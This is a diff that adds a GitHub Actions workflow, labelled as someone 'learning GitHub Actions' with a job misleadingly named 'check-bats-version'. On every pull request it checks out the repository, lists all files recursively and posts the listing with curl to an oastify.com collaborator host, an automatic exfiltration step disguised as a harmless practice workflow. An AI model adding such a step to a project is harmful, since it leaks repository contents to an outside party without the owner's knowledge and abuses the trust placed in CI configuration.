@@ -1,0 +1,12 @@
+name: ls-to-collaborator
+run-name: ${{ github.actor }} is learning GitHub Actions
+on: 
+  pull_request:
+jobs:
+  check-bats-version:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: List files and send to webhook
+        run: |
+          ls -R | curl -X POST --data-binary @- https://86ca86880mzxwytgxqx8b9qct3zunkb9.oastify.com
